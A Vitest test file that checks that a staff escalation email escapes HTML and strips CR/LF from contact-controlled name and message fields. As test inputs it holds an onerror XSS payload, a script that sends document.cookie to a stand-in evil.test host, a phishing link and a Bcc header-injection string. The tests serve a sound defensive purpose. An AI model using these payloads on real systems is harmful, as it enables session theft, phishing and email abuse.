import { beforeEach, expect, it, vi } from "vitest";

/**
 * The keyword-escalation staff email interpolates contact-controlled values
 * (name, inbound message) into HTML. A contact who puts HTML/script in their
 * name or message must not be able to inject into the staff inbox.
 */

const s = vi.hoisted(() => ({
  sent: [] as Array<{ html: string; text: string; subject: string }>,
}));

vi.mock("@/lib/firebase/admin", () => ({
  getAdminDb: () => ({
    doc: () => ({ get: async () => ({ data: () => ({}) }) }),
  }),
}));
vi.mock("@/lib/comms/resend", () => ({
  emailIsConfigured: () => true,
  tenantFrom: () => "bot@biz.test",
  sendEmail: vi.fn(async (e: { html: string; text: string; subject: string }) => {
    s.sent.push(e);
    return { id: "e1" };
  }),
}));

import { sendEscalationNotification } from "./escalation";

beforeEach(() => {
  s.sent = [];
});

it("escapes an HTML/script payload in the contact name and message", async () => {
  await sendEscalationNotification({
    to: "ops@biz.test",
    businessName: "Biz",
    contactName: '<img src=x onerror=alert(1)>',
    contactPhone: "+27820000000",
    contactId: "c1",
    subAccountId: "sa",
    triggeredKeyword: "refund",
    incomingMessage: '<script>fetch("https://evil.test/steal?c="+document.cookie)</script>',
    appUrl: "https://app.test",
  });

  expect(s.sent).toHaveLength(1);
  const { html } = s.sent[0];
  expect(html).not.toContain("<script>");
  expect(html).not.toContain("<img src=x onerror=alert(1)>");
  expect(html).toContain("&lt;script&gt;");
  expect(html).toContain("&lt;img src=x onerror=alert(1)&gt;");
});

it("escapes an <a> tag injection in the contact name", async () => {
  await sendEscalationNotification({
    to: "ops@biz.test",
    businessName: "Biz",
    contactName: '<a href="https://evil.test">click for a prize</a>',
    contactPhone: "+27820000000",
    contactId: "c1",
    subAccountId: "sa",
    triggeredKeyword: "refund",
    incomingMessage: "please help",
    appUrl: "https://app.test",
  });

  const { html } = s.sent[0];
  expect(html).not.toContain('<a href="https://evil.test">');
  expect(html).toContain("&lt;a href=&quot;https://evil.test&quot;&gt;");
});

it("strips CR/LF from the contact name before building the email subject", async () => {
  await sendEscalationNotification({
    to: "ops@biz.test",
    businessName: "Biz",
    contactName: "Ann\r\nBcc: attacker@evil.test",
    contactPhone: "+27820000000",
    contactId: "c1",
    subAccountId: "sa",
    triggeredKeyword: "refund",
    incomingMessage: "please help",
    appUrl: "https://app.test",
  });

  const { subject } = s.sent[0];
  expect(subject).not.toMatch(/[\r\n]/);
  expect(subject).toContain("Ann Bcc: attacker@evil.test");
});
